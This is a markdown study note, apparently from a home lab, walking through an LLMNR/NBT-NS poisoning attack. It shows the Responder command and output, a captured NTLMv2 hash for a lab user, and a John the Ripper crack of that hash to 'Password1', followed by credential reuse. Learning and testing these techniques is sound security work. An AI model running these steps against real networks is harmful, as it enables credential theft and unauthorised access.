# LLMNR Poisoning
## Attack overview
1. Run Responder
```
┌──(kali㉿kali)-[~]
└─$ sudo responder -I eth0 -dPv
                                         __
  .----.-----.-----.-----.-----.-----.--|  |.-----.----.
  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
  |__| |_____|_____|   __|_____|__|__|_____||_____|__|
                   |__|

           NBT-NS, LLMNR & MDNS Responder 3.1.5.0

  To support this project:
  Github -> https://github.com/sponsors/lgandx
  Paypal  -> https://paypal.me/PythonResponder

  Author: Laurent Gaffie (laurent.gaffie@gmail.com)
  To kill this script hit CTRL-C


[+] Poisoners:
    LLMNR                      [ON]
    NBT-NS                     [ON]
    MDNS                       [ON]
    DNS                        [ON]
    DHCP                       [ON]

[+] Servers:
    HTTP server                [ON]
    HTTPS server               [ON]
    WPAD proxy                 [OFF]
    Auth proxy                 [ON]
    SMB server                 [ON]
    Kerberos server            [ON]
    SQL server                 [ON]
    FTP server                 [ON]
    IMAP server                [ON]
    POP3 server                [ON]
    SMTP server                [ON]
    DNS server                 [ON]
    LDAP server                [ON]
    MQTT server                [ON]
    RDP server                 [ON]
    DCE-RPC server             [ON]
    WinRM server               [ON]
    SNMP server                [OFF]

[+] HTTP Options:
    Always serving EXE         [OFF]
    Serving EXE                [OFF]
    Serving HTML               [OFF]
    Upstream Proxy             [OFF]

[+] Poisoning Options:
    Analyze Mode               [OFF]
    Force WPAD auth            [OFF]
    Force Basic Auth           [OFF]
    Force LM downgrade         [OFF]
    Force ESS downgrade        [OFF]

[+] Generic Options:
    Responder NIC              [eth0]
    Responder IP               [10.0.2.7]
    Responder IPv6             [fe80::6e5f:b197:25b4:903e]
    Challenge set              [random]
    Don't Respond To Names     ['ISATAP', 'ISATAP.LOCAL']
    Don't Respond To MDNS TLD  ['_DOSVC']
    TTL for poisoned response  [default]

[+] Current Session Variables:
    Responder Machine Name     [WIN-JEBVSF6PC73]
    Responder Domain Name      [H4RV.LOCAL]
    Responder DCE-RPC Port     [49096]

[+] Listening for events...                                                                                         

[*] [LLMNR]  Poisoned answer sent to 10.0.2.4 for name PUNISHER
[*] [LLMNR]  Poisoned answer sent to fe80::8d56:b374:ee5e:b661 for name PUNISHER
[*] [NBT-NS] Poisoned answer sent to 10.0.2.4 for name MARVEL (service: Domain Master Browser)
[*] [NBT-NS] Poisoned answer sent to 10.0.2.4 for name MARVEL (service: Domain Master Browser)
[*] [NBT-NS] Poisoned answer sent to 10.0.2.4 for name MARVEL (service: Domain Master Browser)
```

2. Generate traffic
   - Load share: \\attacker ip\test
     
4. Capture hash from traffic
```
[+] Listening for events...                                                                                         

[*] [LLMNR]  Poisoned answer sent to 10.0.2.4 for name PUNISHER
[*] [LLMNR]  Poisoned answer sent to fe80::8d56:b374:ee5e:b661 for name PUNISHER
[*] [NBT-NS] Poisoned answer sent to 10.0.2.4 for name MARVEL (service: Domain Master Browser)
[*] [NBT-NS] Poisoned answer sent to 10.0.2.4 for name MARVEL (service: Domain Master Browser)
[*] [NBT-NS] Poisoned answer sent to 10.0.2.4 for name MARVEL (service: Domain Master Browser)
[*] [NBT-NS] Poisoned answer sent to 10.0.2.4 for name MARVEL (service: Browser Election)
[SMB] NTLMv2-SSP Client   : 10.0.2.4
[SMB] NTLMv2-SSP Username : MARVEL\fcastle
[SMB] NTLMv2-SSP Hash     : fcastle::MARVEL:c917605b0159cc7b:C5557131AFD6A7AEA7FC69893F57473C:0101000000000000007284CFAC5ADB0130EF7A488F940F6F0000000002000800480034005200560001001E00570049004E002D004A00450042005600530046003600500043003700330004003400570049004E002D004A0045004200560053004600360050004300370033002E0048003400520056002E004C004F00430041004C000300140048003400520056002E004C004F00430041004C000500140048003400520056002E004C004F00430041004C0007000800007284CFAC5ADB0106000400020000000800300030000000000000000100000000200000BDB1F1B76C81B17DBD739A4862D491F7A8CE1FE9EA7C09E14CCA2A3C676A73B70A0010000000000000000000000000000000000009001A0063006900660073002F00310030002E0030002E0032002E0037000000000000000000                                                                                                      
[HTTP] Sending NTLM authentication request to 10.0.2.4
[HTTP] Sending NTLM authentication request to 10.0.2.4
[HTTP] Sending NTLM authentication request to 10.0.2.4
[HTTP] Sending NTLM authentication request to 10.0.2.4
[HTTP] Sending NTLM authentication request to 10.0.2.4
[HTTP] Sending NTLM authentication request to 10.0.2.4
[HTTP] Sending NTLM authentication request to 10.0.2.4
[HTTP] Sending NTLM authentication request to 10.0.2.4
[+] Exiting...
                                                                                                                    
┌──(kali㉿kali)-[~]
└─$ 
```
4. Crack hash (maybe)
   ```
    $ john hash.txt -w=/usr/share/wordlists/rockyou.txt               
    Using default input encoding: UTF-8
    Loaded 1 password hash (netntlmv2, NTLMv2 C/R [MD4 HMAC-MD5 32/64])
    Will run 2 OpenMP threads
    Press 'q' or Ctrl-C to abort, almost any other key for status
    Password1        (fcastle)     
    1g 0:00:00:00 DONE (2025-01-02 20:38) 33.33g/s 136533p/s 136533c/s 136533C/s adriano..oooooo
    Use the "--show --format=netntlmv2" options to display all of the cracked passwords reliably
    Session completed. 
                                                                                                                                                                        $ 
    ```
5.Utilize password or hash to login
   - Review [Windows\remote-access](https://github.com/toneillcodes/cybersecurity-notes/blob/main/windows/remote-access.md) for ways to login with either
## Tools
- Responder
- Hashcat
- John the ripper
